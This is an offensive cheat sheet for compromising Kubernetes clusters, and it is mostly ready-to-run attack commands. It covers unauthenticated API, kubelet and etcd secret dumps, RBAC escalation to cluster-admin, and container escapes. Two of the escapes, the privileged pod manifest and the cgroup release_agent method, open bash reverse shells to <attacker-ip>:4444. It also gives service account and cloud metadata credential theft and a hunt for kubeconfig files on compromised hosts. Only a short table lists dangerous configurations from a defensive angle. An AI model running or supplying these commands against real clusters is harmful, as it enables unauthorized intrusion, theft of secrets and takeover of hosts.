# Kubernetes

## What is it?
Kubernetes (k8s) is a container orchestration platform. Attack surface includes unauthenticated API endpoints, misconfigured RBAC, exposed dashboards, kubelet exec, etcd secrets dump, container escape, and cloud metadata abuse from within pods.

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 6443 | TCP | Kubernetes API server (HTTPS) |
| 8080 | TCP | API server (HTTP — insecure, legacy) |
| 10250 | TCP | Kubelet API (read/exec on nodes) |
| 10255 | TCP | Kubelet read-only API (no auth, legacy) |
| 2379 | TCP | etcd client port |
| 2380 | TCP | etcd peer port |
| 8001 | TCP | kubectl proxy (local) |
| 8443 | TCP | Kubernetes Dashboard (HTTPS) |
| 30000–32767 | TCP/UDP | NodePort services |

---

## Enumeration

```bash
# API server check — unauthenticated
curl -sk https://<target>:6443/version
curl -sk https://<target>:6443/api
curl -sk https://<target>:6443/apis

# Check if anonymous auth enabled (should return 403 not 401)
curl -sk https://<target>:6443/api/v1/pods
curl -sk https://<target>:6443/api/v1/secrets

# Insecure API server (HTTP, port 8080 — rare but exists)
curl -s http://<target>:8080/api/v1/pods
curl -s http://<target>:8080/api/v1/secrets

# Kubelet read-only (10255 — no auth required)
curl -sk http://<target>:10255/pods
curl -sk http://<target>:10255/metrics
curl -sk http://<target>:10255/stats/summary

# Kubelet exec API (10250)
curl -sk https://<target>:10250/pods
curl -sk https://<target>:10250/runningpods/

# etcd — check if accessible without TLS/auth
curl http://<target>:2379/version
curl http://<target>:2379/v2/keys/
curl http://<target>:2379/v3/auth/status

# Nmap
nmap -sV -p 6443,8080,10250,10255,2379,2380,8443 <target>

# Shodan dorks
port:6443 product:"Kubernetes"
port:10250 "kubelet"
port:2379 "etcd"
```

---

## kubectl Setup

```bash
# Connect with a token
kubectl --server=https://<target>:6443 \
  --token=<bearer-token> \
  --insecure-skip-tls-verify \
  get pods -A

# Connect with a kubeconfig file
export KUBECONFIG=/path/to/kubeconfig
kubectl get pods -A

# Connect anonymously (test if anon auth enabled)
kubectl --server=https://<target>:6443 \
  --insecure-skip-tls-verify \
  get pods -A

# Check what you can do
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system

# Check all permissions across all namespaces
kubectl auth can-i '*' '*' --all-namespaces

# Enumerate namespaces
kubectl get namespaces

# Get all pods across all namespaces
kubectl get pods -A -o wide

# Get all services (NodePort exposure)
kubectl get services -A

# Get secrets
kubectl get secrets -A
kubectl get secret <name> -n <namespace> -o jsonpath='{.data}' | base64 -d

# Get configmaps (often contain credentials)
kubectl get configmaps -A
kubectl describe configmap <name> -n <namespace>

# Service accounts and their tokens
kubectl get serviceaccounts -A
kubectl get secret -A | grep token
```

---

## API Server — Anonymous / Unauthenticated Access

```bash
# If anonymous auth enabled — full API access without credentials
# Test:
curl -sk https://<target>:6443/api/v1/namespaces/default/pods
curl -sk https://<target>:6443/api/v1/namespaces/kube-system/secrets

# Dump all secrets (base64 encoded data field)
curl -sk https://<target>:6443/api/v1/secrets | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, data:.data}'

# Decode a secret value
echo "<base64-value>" | base64 -d

# List all pods with their images and node placement
curl -sk https://<target>:6443/api/v1/pods | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, node:.spec.nodeName, image:.spec.containers[].image}'

# Get a service account token from a secret
curl -sk https://<target>:6443/api/v1/namespaces/kube-system/secrets | \
  jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name:.metadata.name, token:.data.token}' | \
  grep token | awk '{print $2}' | tr -d '"' | base64 -d

# exec into a pod via API
curl -sk https://<target>:6443/api/v1/namespaces/default/pods/<pod>/exec \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"command":["/bin/sh","-c","id"],"stdin":false,"stdout":true,"stderr":true,"tty":false}'
```

---

## Kubelet API (Port 10250) — exec on Nodes

```bash
# List running pods on a node
curl -sk https://<target>:10250/pods | jq '.items[].metadata | {name:.name, ns:.namespace}'

# Execute command in a pod via kubelet (no API server auth needed if kubelet allows anon)
# Format: /run/<namespace>/<pod>/<container>
curl -sk https://<target>:10250/run/default/<pod-name>/<container-name> \
  -X POST \
  -d "cmd=id"

curl -sk https://<target>:10250/run/kube-system/<pod-name>/<container-name> \
  -X POST \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Enumerate all pods then exec into each
PODS=$(curl -sk https://<target>:10250/pods | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)/\(.spec.containers[0].name)"')
for pod in $PODS; do
  NS=$(echo $pod | cut -d/ -f1)
  PODNAME=$(echo $pod | cut -d/ -f2)
  CONTAINER=$(echo $pod | cut -d/ -f3)
  echo "=== $NS/$PODNAME/$CONTAINER ==="
  curl -sk https://<target>:10250/run/$NS/$PODNAME/$CONTAINER -X POST -d "cmd=cat /etc/passwd" 2>/dev/null
done

# Get node metrics / resource usage
curl -sk https://<target>:10250/stats/summary
curl -sk https://<target>:10250/metrics

# Read-only kubelet (10255 — no exec)
curl http://<target>:10255/pods
curl http://<target>:10255/stats/
```

---

## etcd — Secret Dump (No Auth)

```bash
# Check etcd is accessible
curl http://<target>:2379/version
curl http://<target>:2379/health

# v2 API — list all keys
curl http://<target>:2379/v2/keys/?recursive=true

# v3 API — dump all key-value pairs (etcdctl)
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix

# Dump Kubernetes secrets from etcd (stored at /registry/secrets/)
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get /registry/secrets/ --prefix

# Extract specific namespace secrets
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get /registry/secrets/kube-system/ --prefix

# Dump service account tokens
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get /registry/secrets/ --prefix | \
  strings | grep -A5 "service-account-token"

# etcd with TLS (client cert required — if you have them from a compromised node)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<target>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

---

## Kubernetes Dashboard

```bash
# Check if dashboard is exposed
curl -sk https://<target>:8443/
curl -sk http://<target>:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Dashboard login page — look for "Skip" button (anonymous access)
# If skip is available: full cluster access via browser

# Enumerate dashboard via kubectl proxy
kubectl proxy &   # binds to localhost:8001
curl http://127.0.0.1:8001/api/v1/namespaces/kubernetes-dashboard/services/

# Dashboard NodePort — check exposed ports
kubectl get svc -n kubernetes-dashboard
# If type=NodePort: accessible at http://<any-node-ip>:<nodeport>

# Token-based login — find dashboard service account token
kubectl -n kubernetes-dashboard get secret | grep dashboard
kubectl -n kubernetes-dashboard describe secret <dashboard-secret> | grep token:

# If you have a token — paste directly in dashboard login
# Or use via kubectl:
kubectl --token=<token> get pods -A
```

---

## RBAC Privilege Escalation

```bash
# Check current permissions
kubectl auth can-i --list
kubectl auth can-i --list -n kube-system

# High-value permissions to look for:
# - create pods (in any namespace)
# - get/list secrets
# - bind clusterroles
# - impersonate users/groups
# - create/update rolebindings
# - exec into pods
# - create clusterrolebindings

# Check if you can impersonate cluster-admin
kubectl auth can-i '*' '*' --as=system:admin

# Create a privileged pod to escape to host (if you can create pods)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: privesc
    image: ubuntu
    command: ["/bin/sh", "-c", "nsenter --mount=/proc/1/ns/mnt -- /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Bind yourself to cluster-admin (if you have RBAC write)
kubectl create clusterrolebinding pwned-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# Impersonate a higher-privileged user (if impersonate permission)
kubectl get pods -A --as=system:admin
kubectl get secrets -A --as=system:admin
```

---

## Container Escape — Privileged Container

```bash
# Check if running in privileged container
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff  = fully privileged

capsh --decode=0000003fffffffff  # decode capabilities

# Check for sensitive mounts
mount | grep -i "docker\|k8s\|kube\|containerd"
ls /dev/

# Method 1 — Mount host filesystem via /dev
# List block devices
ls /dev/sd* /dev/xvd* /dev/nvme*
# Mount host root partition
mkdir /host-escape
mount /dev/sda1 /host-escape
chroot /host-escape
# Now in host filesystem — read /etc/shadow, ssh keys, kubeconfigs

# Method 2 — cgroup release_agent (classic escape)
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Method 3 — host pid namespace (hostPID: true)
# List host processes
ls /proc/*/exe 2>/dev/null | head -20
# nsenter into host namespace
nsenter --mount=/proc/1/ns/mnt -- bash
nsenter -t 1 -m -u -i -n bash   # full host namespace

# Method 4 — docker.sock mounted in container
ls /var/run/docker.sock
# Use docker CLI or curl to escape
docker run -v /:/host -it --privileged ubuntu chroot /host bash
# OR via curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"],"Privileged":true}'
```

---

## Service Account Token Abuse (From Inside a Pod)

```bash
# Default service account token location (every pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Set variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Query API server with pod's service account token
curl -s $APISERVER/api/v1/namespaces/default/pods \
  --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN"

# Check permissions of current service account token
curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# List all secrets from API
curl -s $APISERVER/api/v1/secrets \
  --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN"

# Look for other service account tokens in secrets (often have higher perms)
curl -s $APISERVER/api/v1/namespaces/kube-system/secrets \
  --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" | \
  jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name:.metadata.name, token:.data.token}'
```

---

## Cloud Metadata from Inside Pods

```bash
# AWS IMDS — from any pod running on AWS nodes
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Get instance role name, then:
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# Returns: AccessKeyId, SecretAccessKey, Token — use with aws cli

# IMDSv2 (token required)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# Use AWS creds from pod to enumerate IAM
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls
aws ec2 describe-instances
```

---

## Tools

```bash
# kubectl (standard)
apt install kubectl

# kubeletctl — kubelet API interaction tool
# https://github.com/cyberark/kubeletctl
kubeletctl pods -s <target>
kubeletctl exec "id" -p <pod> -c <container> -s <target>
kubeletctl scan rce -s <target>   # scan all pods for RCE via kubelet
kubeletctl scan token -s <target> # scan all pods for SA tokens

# kube-hunter — passive and active cluster scanning
pip install kube-hunter
kube-hunter --remote <target>      # remote scan
kube-hunter --pod                  # run from inside a pod
kube-hunter --remote <target> --active  # active exploitation attempts

# peirates — Kubernetes pentest tool
# https://github.com/inguardians/peirates
peirates   # interactive menu for pod SA token abuse, secret dump, escape

# kubeaudit — audit cluster for misconfigs
# https://github.com/Shopify/kubeaudit
kubeaudit all -f kubeconfig.yaml

# truffleHog / gitleaks — scan configmaps/secrets for embedded credentials
kubectl get configmap -A -o json | trufflehog filesystem /dev/stdin

# Trivy — scan images for CVEs
trivy image <image:tag>
```

---

## Kubeconfig File Locations & Extraction

```bash
# Default kubeconfig locations
~/.kube/config
/etc/kubernetes/admin.conf         # cluster admin (on control plane)
/etc/kubernetes/scheduler.conf     # scheduler SA
/etc/kubernetes/controller-manager.conf
/var/lib/kubelet/kubeconfig        # node kubelet credentials

# Extract kubeconfig from compromised node
cat /etc/kubernetes/admin.conf

# Windows node
type C:\Users\<user>\.kube\config
type C:\ProgramData\kubernetes\kubeconfig

# High-value: admin.conf contains cluster-admin credentials
# Copy and use externally:
export KUBECONFIG=/tmp/stolen-admin.conf
kubectl get secrets -A

# Parse token from kubeconfig
grep "token:" ~/.kube/config | awk '{print $2}' | base64 -d

# Find kubeconfig files on a compromised host
find / -name "kubeconfig" -o -name "*.kubeconfig" -o -name "config" -path "*/.kube/*" 2>/dev/null
find / -name "*.conf" -path "*/kubernetes/*" 2>/dev/null
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| API server anonymous auth (`--anonymous-auth=true`) | Full cluster access without credentials |
| Kubelet anonymous auth (`authentication.anonymous.enabled: true`) | RCE on all pods on a node |
| etcd no TLS / no auth | Full cluster secret dump including all service account tokens |
| `privileged: true` in pod spec | Container escape to host via cgroup/device |
| `hostPID: true` / `hostNetwork: true` | Lateral movement via host namespaces |
| `hostPath` volume mount to `/` | Read/write host filesystem from pod |
| `docker.sock` mounted in container | Full Docker daemon access = host escape |
| Dashboard with skip button / anonymous access | Browser-based cluster-admin |
| Default service account with cluster-admin binding | Any pod = cluster-admin |
| Secrets stored in env vars (not mounted) | Visible via `/proc/<pid>/environ` |
| `automountServiceAccountToken: true` (default) | Every pod gets API token |
| RBAC wildcard rules (`verbs: ['*']`) | SA can do anything in namespace |

---

## Quick Reference

```bash
# API server anonymous access check
curl -sk https://<target>:6443/api/v1/namespaces

# kubelet read-only pods list
curl http://<target>:10255/pods | jq '.items[].metadata.name'

# kubelet exec (anon)
curl -sk https://<target>:10250/run/default/<pod>/<container> -X POST -d "cmd=id"

# etcd dump
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only

# dump all secrets from API
kubectl get secrets -A -o json | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, data:.data}'

# from inside pod — SA token + API query
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $TOKEN"

# privileged pod escape — host filesystem
kubectl run escape --image=ubuntu --restart=Never --privileged \
  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"ubuntu","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'

# kubeletctl scan
kubeletctl scan rce -s <target>
```
